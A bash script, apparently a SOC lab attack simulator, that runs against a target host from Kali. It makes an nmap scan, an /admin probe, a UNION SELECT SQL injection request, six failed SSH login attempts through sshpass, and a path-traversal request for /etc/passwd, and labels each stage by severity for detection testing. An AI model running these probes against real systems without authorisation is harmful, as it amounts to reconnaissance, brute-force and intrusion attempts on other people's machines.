#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-linux-target}"
MODE="${2:-all}"

run_recon() {
  echo "[1/3] Recon (LOW/MEDIUM): ICMP ping + Nmap port scan + HTTP /admin probe..."
  ping -c 2 -W 2 "$TARGET" || true
  nmap -sT -Pn -p 22,80,8080 "$TARGET" || true
  curl -sS --max-time 3 -o /dev/null -w "HTTP /admin status: %{http_code}\n" \
    -A "Nmap Scripting Engine" "http://${TARGET}/admin" || true
}

run_web() {
  echo "[2/3] Web Attack (HIGH): SQL Injection pattern against Nginx..."
  curl -sS --max-time 3 -o /dev/null -w "HTTP SQLi status: %{http_code}\n" \
    "http://${TARGET}/?id=1%20UNION%20SELECT%201,2,3" || true
}

run_ssh() {
  echo "[3/3] Brute Force & Exploit (CRITICAL): SSH failed logins + /etc/passwd traversal..."
  for attempt in 1 2 3 4 5 6; do
    sshpass -p "wrong-password-${attempt}" ssh \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=2 \
      "soclab-user@${TARGET}" exit >/dev/null 2>&1 || true
  done
  curl -sS --max-time 3 -o /dev/null -w "HTTP /etc/passwd status: %{http_code}\n" \
    "http://${TARGET}/?file=/etc/passwd" || true
}

check_access() {
  echo "Testing connectivity from Kali ($(hostname -I | xargs)) -> ${TARGET}..."
  if curl -sS --max-time 3 -o /dev/null "http://${TARGET}/"; then
    echo "ACCESS: OPEN (HTTP 200 reachable from attacker)"
    return 0
  else
    echo "ACCESS: BLOCKED (connection timed out or refused)"
    return 1
  fi
}

case "$MODE" in
  recon) run_recon ;;
  web) run_web ;;
  ssh) run_ssh ;;
  check) check_access ;;
  all)
    run_recon
    run_web
    run_ssh
    ;;
  *)
    echo "Usage: $0 [target_host] [recon|web|ssh|all|check]" >&2
    exit 2
    ;;
esac
